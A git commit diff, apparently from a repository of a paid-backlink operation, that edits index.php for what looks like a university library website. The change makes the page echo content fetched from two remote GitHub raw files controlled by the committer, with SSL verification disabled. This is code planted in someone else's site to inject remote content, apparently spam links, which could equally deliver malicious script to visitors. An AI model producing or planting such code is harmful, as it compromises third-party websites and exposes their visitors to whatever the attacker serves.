697a771b02b5d14cb55f919ac47315a331c4080f
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2024-02-19 12:22:55 +0800

    Update index.php

--- site/stikes-bhaktipertiwi/library.stikesbpi.ac.id/index.php
+++ site/stikes-bhaktipertiwi/library.stikesbpi.ac.id/index.php
@@ -363,9 +363,12 @@ function curlGetContents($url) {
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $fileContents = curl_exec($ch);
     curl_close($ch);
-    return $fileContents; }
+    return $fileContents; 
+}
 $url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
 $url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/library.stikesbpi.ac.id/system.txt';
 $fileContents1 = curlGetContents($url1);
 $fileContents2 = curlGetContents($url2);
+echo $fileContents1;
+echo $fileContents2;
 ?>
